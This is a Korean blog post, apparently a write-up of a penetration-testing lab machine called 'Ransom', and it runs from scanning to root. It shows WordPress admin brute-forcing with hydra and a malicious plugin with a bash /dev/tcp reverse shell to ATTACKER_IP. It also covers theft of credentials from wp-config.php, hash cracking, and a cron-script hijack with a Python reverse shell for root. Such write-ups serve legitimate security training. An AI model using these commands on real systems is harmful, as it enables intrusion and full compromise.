---
title: '[BHPT] Ransom'
layout: post
date: 2026-11-09 12:00:00 +0900
featured: /assets/images/redraccoon-logo.png
---

# 5.Ransom 모의해킹

## 점검환경

분석 기간 | 호스트 이름 | IP주소 | 점검자
---|:---:|---:|---:
2025년 12월 5일 ~ 2025년 12월 6일 | ransom | TARGET_IP | 진엽

## 모의해킹 수행 내용
### 정보 수집
대상 호스트의 아이피주소를 상대로 모든 TCP 포트들의 상태를 알아보기 위해 TCP SYN 스캔을 이용해 포트스캐닝을 진행했다.
```
└─$ sudo nmap -sS -p- --max-retries 1 -Pn -n --open TARGET_IP --min-rate 1500 -oA fullport
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-05 07:02 EST
Nmap scan report for TARGET_IP
Host is up (0.052s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 16.29 seconds


```
포트 스캔 결과 포트 80이 열려있었고, 다른 포트들은 모두 닫히거나 필터링 된 상태였다. 해당 포트에서 어떤 종류의 네트워크 서비스들이 실행중인지 알아보기 위해 서비스 배너 그래빙과 Nmap 기본 스크립트를 이용해 더 자세한 정보 수집을 진행했다.
```
└─$ nmap -p 80 -sV -sC -Pn -n --open TARGET_IP --min-rate 1000 -oA tcpDetailed
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-05 07:03 EST
Nmap scan report for TARGET_IP
Host is up (0.049s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: ToorG RANSOM &#8211; LEAKED DATA
|_http-generator: WordPress 6.3.1
|_http-server-header: Apache/2.4.52 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.72 seconds
```

워드프레스를 사용하는 것을 위에서 확인하여, wpscan을 이용해 웹 스캔 결과 admin 계정을 확인함. 
```
└─$ wpscan --url http://TARGET_IP --enumerate u
.
.
.
[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://TARGET_IP/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```

cewl을 이용하여 웹 크롤링을 통해 단어 추출.
```
└─$ cewl TARGET_IP  | tee password.txt
CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
the
and
Groot
their
.
.
.
corporate
```

admin계정과 추출한 단어 password.txt로 패스워드를 지정한 뒤 히드라로 패스워드 무차별 공격 시도.
```
└─$ hydra -l admin -P password.txt TARGET_IP http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' -V -f
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-05 07:14:5
.
.
.
[80][http-post-form] host: TARGET_IP   login: admin   password: [REDACTED_PASSWORD]
```

크래킹한 패스워드로 로그인 시 관리자 페이지 접근 성공.
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-ransom/image.png)

![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-ransom/image-1.png)


초기 접근을 위한 리버스쉘 악성 워드프레스 플러그인을 만들어 ZIP으로 압축.
```
└─$ cat plugin.php 
<?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: a
* Author URI: <http://www.a.com>
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/9988 0>&1'");
?>

└─$ zip plugin.zip plugin.php
```

압축한 플러그인을 Add Plugins에 업로드 후, Activat Plugin을 클릭.
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-ransom/image-2.png)
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-ransom/image-3.png)


플러그인을 활성화 하기 전 nc를 통해 포트를 열어 놓으면, 초기 접근 성공하는 것을 확인함.
```
└─$ sudo nc -lvnp 9988             
listening on [any] 9988 ...
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 38464
bash: cannot set terminal process group (555): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-172-31-128-239:/var/www/html/wp-admin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

습득한 쉘을 Full TTY 리버스쉘 업그레이드.
```
www-data@ip-172-31-128-239:/var/www/html/wp-admin$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ip-172-31-128-239:/var/www/html/wp-admin$ ^Z 
zsh: suspended  sudo nc -lvnp 9988
┌──(kali㉿kali)-[~/Desktop/ransom]
└─$ stty raw -echo; fg
[1]  + continued  sudo nc -lvnp 9988
Terminal type? xterm
www-data@ip-172-31-128-239:/var/www/html/wp-admin$ export TERM=xterm-256color
```

웹 설정 파일(wp-config.php)에서 데이터베이스 유저의 비밀번호 획득.
```
www-data@ip-172-31-128-239:/var/www/html/wp-admin$ cat /var/www/html/wp-config.php
.
.
.
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wordpressuser' );

/** Database password */
define( 'DB_PASSWORD', '[REDACTED_PASSWORD]' )
```

mysql의 root 유저의 비밀번호 또한 [REDACTED_PASSWORD]으로 동일하여 로그인.
```
www-data@ip-172-31-128-239:/var/www/html/wp-admin$ mysql -u root -p'[REDACTED_PASSWORD]'
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 26
Server version: 8.0.34-0ubuntu0.22.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

gang DB의 orgusers테이블에서 블로그 관리자 계정을 획득.
```
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| gang               |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| wordpress          |
+--------------------+
6 rows in set (0.00 sec)

mysql> use gang;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+----------------+
| Tables_in_gang |
+----------------+
| orgusers       |
+----------------+
1 row in set (0.00 sec)

mysql> select * from orgusers;
+----+-------------+----------------------------------+------------------------------------------+
| id | username    | email                            | sha1password                             |
+----+-------------+----------------------------------+------------------------------------------+
|  1 | blogadmin   | blogadmin@toorgvirus.tor.onion   | 8a2da05455775e8987cbfac5a0ca54f3f728e274 |
```

위에서 발견된 게정정보를 blogadmin.hash에 저장 후, johntheripper를 통해 해시크래킹 진행.
```
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt blogadmin.hash
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
Use the "--format=Raw-SHA1-Linkedin" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"
Use the "--format=ripemd-160" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "has-160"
Use the "--format=has-160" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
[REDACTED_PASSWORD]           (?)
```

su를 통해 blogadmin과 패스워드 [REDACTED_PASSWORD]를 입력하면 블로그 관리자 계정으로 접속 성공함.
```
www-data@ip-172-31-128-239:/var/www/html/wp-admin$ su blogadmin
Password: 
blogadmin@ip-172-31-128-239:/var/www/html/wp-admin$ id
uid=1001(blogadmin) gid=1001(blogadmin) groups=1001(blogadmin)
```

그 후 cron.d에서 blog-backup 파일을 확인하였으며, 1분 마다 /dev/shm/onetime-backup.py 파일 실행.
```
blogadmin@ip-172-31-128-239:/etc/cron.d$ la -alrth
total 24K
-rw-r--r--  1 root root  201 Jan  8  2022 e2scrub_all
-rw-r--r--  1 root root  712 Jan 28  2022 php
-rw-r--r--  1 root root  102 Mar 23  2022 .placeholder
-rw-r--r--  1 root root   61 Sep 18  2023 blog-backup
drwxr-xr-x  2 root root 4.0K Sep 18  2023 .
drwxr-xr-x 99 root root 4.0K Jan  7 12:19 ..
blogadmin@ip-172-31-128-239:/etc/cron.d$ cat blog-backup
*/1 * * * * root /usr/bin/python3 /dev/shm/onetime-backup.py
```

cronjob에 명시되어 있던 onetime-backup.py 를 수정하여 리버스 쉘 제작.
```
blogadmin@ip-172-31-128-239:/etc/cron.d$ echo 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' > /dev/shm/onetime-backup.py
blogadmin@ip-172-31-128-239:/etc/cron.d$ chmod +x /dev/shm/onetime-backup.py
```

nc를 통해 포트를 열어 놓으면, root 계정에 접근하여 권한상승됨.
```
└─$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 38448
# id
id
uid=0(root) gid=0(root) groups=0(root)
```


